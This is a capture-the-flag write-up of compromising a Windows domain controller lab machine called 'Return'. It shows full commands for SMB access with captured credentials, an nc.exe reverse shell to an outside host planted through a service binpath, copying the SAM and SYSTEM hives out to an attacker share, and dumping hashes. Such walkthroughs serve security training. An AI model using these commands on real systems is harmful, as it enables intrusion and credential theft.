## Default Information
IP Address: 10.10.11.108\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.108    return.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.11.108 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-01 03:17:57 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 52542/udp on 10.10.11.108                                 
Discovered open port 139/tcp on 10.10.11.108                                   
Discovered open port 49697/tcp on 10.10.11.108                                 
Discovered open port 47001/tcp on 10.10.11.108                                 
Discovered open port 3268/tcp on 10.10.11.108                                  
Discovered open port 49664/tcp on 10.10.11.108                                 
Discovered open port 52777/udp on 10.10.11.108                                 
Discovered open port 49672/tcp on 10.10.11.108                                 
Discovered open port 49674/tcp on 10.10.11.108                                 
Discovered open port 49679/tcp on 10.10.11.108                                 
Discovered open port 80/tcp on 10.10.11.108                                    
Discovered open port 389/tcp on 10.10.11.108                                   
Discovered open port 49666/tcp on 10.10.11.108                                 
Discovered open port 53/tcp on 10.10.11.108                                    
Discovered open port 5985/tcp on 10.10.11.108                                  
Discovered open port 88/tcp on 10.10.11.108                                    
Discovered open port 135/tcp on 10.10.11.108                                   
Discovered open port 53095/udp on 10.10.11.108                                 
Discovered open port 49675/tcp on 10.10.11.108                                 
Discovered open port 593/tcp on 10.10.11.108                                   
Discovered open port 3269/tcp on 10.10.11.108                                  
Discovered open port 464/tcp on 10.10.11.108                                   
Discovered open port 9389/tcp on 10.10.11.108                                  
Discovered open port 636/tcp on 10.10.11.108                                   
Discovered open port 445/tcp on 10.10.11.108                                   
Discovered open port 49682/tcp on 10.10.11.108                                 
Discovered open port 49665/tcp on 10.10.11.108                                 
Discovered open port 49667/tcp on 10.10.11.108                                 
Discovered open port 52898/udp on 10.10.11.108                                 
Discovered open port 61235/tcp on 10.10.11.108  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

```
PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open     http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-04-30 16:56:22Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
405/tcp   filtered ncld          no-response
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack ttl 127
3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack ttl 127
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
61235/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

Looking at the nmap output for port 80, we realize that this is a printer admin portal. We also realize that port 139 and 445 are open which means that SMB is available on this machine. 

### SMB Enumeration on port 139
Let us first test for null authentication on port 139 using smbmap. Unfortunately, we are unable to do null authentication on port 139.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u '' -p '' -H 10.10.11.108 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.11.108
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p '' -H 10.10.11.108 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.11.108
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ smbmap -u '' -p null -H 10.10.11.108 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.11.108
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p null -H 10.10.11.108 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.11.108
                                                               
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.11.108 -P 139 2>&1 
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.11.108
```

### SMB Enumeration on port 445
Next, we will try to do null authentication for SMB on port 445 using smbmap. Even though we are able to do a null authentication, we could not enumerate any shares on port 445.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u '' -p '' -H 10.10.11.108 -P 445 2>&1  
[+] IP: 10.10.11.108:445        Name: return.htb 
```

### Web Enumeration
We will first use Gobuster to enumerate the endpoints on http://return.htb:80.

```
http://10.10.11.108:80/Index.php            (Status: 200) [Size: 28274]
http://10.10.11.108:80/Images               (Status: 301) [Size: 153] [--> http://10.10.11.108:80/Images/]
http://10.10.11.108:80/images               (Status: 301) [Size: 153] [--> http://10.10.11.108:80/images/]
http://10.10.11.108:80/index.php            (Status: 200) [Size: 28274]
http://10.10.11.108:80/index.php            (Status: 200) [Size: 28274]
http://10.10.11.108:80/settings.php         (Status: 200) [Size: 29090]
```

Viewing http://return.htb/settings.php, we can find that a username which is ```svc-printer```. Unfortunately, the password is not shown in plaintext so we are unable to view the password.
![Obtaining username](https://github.com/joelczk/writeups/blob/main/HTB/Images/Return/username.png)

## Exploit
### Obtaining password
From http://return.htb/settings.php, we realize that we are able to update the settings configuration, and we are also able to modify the server address and the server port. Let us open a listening server on our local machine and modify the server address to our local machine. 

![Modifiying server address](https://github.com/joelczk/writeups/blob/main/HTB/Images/Return/settings_modification.png)

Upon updating the settings, we are able to obtain the password in our listener on our local machine. 
![Obtaining password](https://github.com/joelczk/writeups/blob/main/HTB/Images/Return/password.png)

### SMB Enumeration for svc-printer
Using the credentials that we have obtained, we realized that we are now able to enumerate the shares on SMB using smbmap

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u svc-printer -p '1edFg43012!!' -H 10.10.11.108 -P 445 2>&1
[+] IP: 10.10.11.108:445        Name: return.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ ONLY       Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```

Let us use smbclient to access the C$ share that we have found using smbmap

```
┌──(kali㉿kali)-[~]
└─$ smbclient -U 'svc-printer%1edFg43012!!' //10.10.11.108/C$ 2>&1 
Try "help" to get a list of possible commands.
smb: \> 
```

### Obtaining user flag
Firstly, we will have to navigate to /Users/svc-printer/Desktop to find the user.txt file and download the user.txt file

```
┌──(kali㉿kali)-[~/Desktop/return]
└─$ smbclient -U 'svc-printer%1edFg43012!!' //10.10.11.108/C$ 2>&1 
Try "help" to get a list of possible commands.
smb: \> cd Users/svc-printer/Desktop
smb: \Users\svc-printer\Desktop\> dir
  .                                  DR        0  Wed May 26 05:05:55 2021
  ..                                 DR        0  Wed May 26 05:05:55 2021
  user.txt                           AR       34  Sat Apr 30 12:33:11 2022
                5056511 blocks of size 4096. 1955036 blocks available
smb: \Users\svc-printer\Desktop\> get user.txt
getting file \Users\svc-printer\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Users\svc-printer\Desktop\> 
```
Afterwards, all we have to do is to view the downloaded user.txt file to obtain the user flag.

```
┌──(kali㉿kali)-[~/Desktop/return]
└─$ cat user.txt 
<Redacted user flag>
```
### Privilege Escalation to SYSTEM
Next, we realize that we can authenticate to the server via evil-winrm using the obtain credentials as well. 

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'            
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```

Using WinPeas, we found out that the svc-printer user is a member of the Server Operators group. Since svc-printer is part of the Server Operatores group, the user will be able to create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer.

```
Users
Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups                                                                  
  [X] Exception: Object reference not set to an instance of an object.
  Current user: svc-printer
  Current groups: Domain Users, Everyone, Server Operators, Print Operators, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, NTLM Authentication
```

Looking at the article from [here](https://cube0x0.github.io/Pocing-Beyond-DA/), since svc-printer is part of the Server Operators group, we can modify the config of the VSS service such that it creates a reverse shell using the nc.exe that we have uploaded.

```
*Evil-WinRM* PS C:\temp> sc.exe config VSS binpath="C:\temp\nc.exe -e cmd.exe 10.10.16.6 4000"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\temp> 
```

Afterwards, all we have to do is to start the service to obtain the reverse shell

```
*Evil-WinRM* PS C:\temp> sc.exe start VSS
```

### Obtaining root flag
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```
## Post-Exploitation
### BloodHound
We can use BloodHound to search for privilege escalation vectors. We will then save the output to return.zip file

```
*Evil-WinRM* PS C:\temp> ./SharpHound.exe -c all --zipfilename return.zip
2022-05-01T05:27:28.7753786-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-05-01T05:27:28.7753786-07:00|INFORMATION|Initializing SharpHound at 5:27 AM on 5/1/2022
2022-05-01T05:27:28.9472561-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-05-01T05:27:29.1035004-07:00|INFORMATION|Beginning LDAP search for return.local
2022-05-01T05:27:29.1347737-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-05-01T05:27:29.1347737-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-05-01T05:27:59.8535214-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2022-05-01T05:28:11.8535002-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2022-05-01T05:28:12.1816246-07:00|INFORMATION|Consumers finished, closing output channel
2022-05-01T05:28:12.2128736-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-05-01T05:28:12.5253728-07:00|INFORMATION|Status: 91 objects finished (+91 2.116279)/s -- Using 42 MB RAM
2022-05-01T05:28:12.5253728-07:00|INFORMATION|Enumeration finished in 00:00:43.4333981
2022-05-01T05:28:12.6503786-07:00|INFORMATION|SharpHound Enumeration Completed at 5:28 AM on 5/1/2022! Happy Graphing!
```

Next, what we have to do is to set up a smbserver on our local machine and transfer the file over from evil-winrm. (NOTE: We have to set username and password on the smbserver on the local machine for this to work)

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbserver share return -smb2support -username test -password test -ip 10.10.16.6 
----------------------------------------------------------------------------------------------
*Evil-WinRM* PS C:\temp> net use \\10.10.16.6\share /user:test test
*Evil-WinRM* PS C:\temp> copy 20220501052811_return.zip \\10.10.16.6\share
*Evil-WinRM* PS C:\temp> del 20220501052811_return.zip
```

### SeBackupPrivilege
Looking at the ```whoami /priv``` command, we realize that the SeBackupPrivilege is enabled on this machine. This means that the user is able to read all the files on this Windows machine. 

This means that we can save the SAM and SYSTEM registry files to our temp directory and transfer them over to our local machine. 

```
*Evil-WinRM* PS C:\temp> reg save hklm\sam c:\temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system c:\temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\temp> net use \\10.10.16.6\share /user:test test
The command completed successfully.

*Evil-WinRM* PS C:\temp> copy sam \\10.10.16.6\share\sam
*Evil-WinRM* PS C:\temp> copy system \\10.10.16.6\share\system
```

Afterwards, we can use impacket-secretsdump to dump the SAM hashes

```
┌──(kali㉿kali)-[~/Desktop/return/dump]
└─$ impacket-secretsdump -sam sam -system system local                                        
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

However, for this machine, we are unable to use the hashes to do a pass-the-hash attack to authenticate to the server. This is probably because the Administrator user does not have the privileges to authenticate to the SMB server.

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.108 -u Administrator -H 34386a771aaca697f447754e4863d38a -x whoami
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [-] return.local\Administrator:34386a771aaca697f447754e4863d38a STATUS_LOGON_FAILURE
```

## SeLoadDriver Privilege
Looking at the output of ```whoami /priv```, we realize that SeLoadDriver privilge is enabled. Hence, we will try to do the ExploitCapcom exploit. However, we are unable to load the vulnerable driver into the server.

```
*Evil-WinRM* PS C:\temp> ./eoploadriver.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3750359090-2939318659-876128439-1103\System\CurrentControlSet\MyService
NTSTATUS: c00000e5, WinError: 0
*Evil-WinRM* PS C:\temp> ./ExploitCapcom.exe
[*] Capcom.sys exploit
[-] CreateFile failed
```
Looking at the output from loading the driver, we realized that it returns us with a NTSTATUS of c00000e5 instead of 00000000. Searching up the NTSTATUS code from [here](https://blog.actorsfit.com/a?ID=00650-4b388814-e627-418f-83d7-6b6c852d02a0), we realize that this corresponds to an STATUS_INTERNAL_ERROR.

Looking at one of the issues on github found [here](https://github.com/TarlogicSecurity/EoPLoadDriver/issues/1), this might be due to the fact that NTLoadDriver forbids any references to registry keys under HKEY_CURRENT_USER. Hence, we are unable to modify the registry keys to load the drivers.
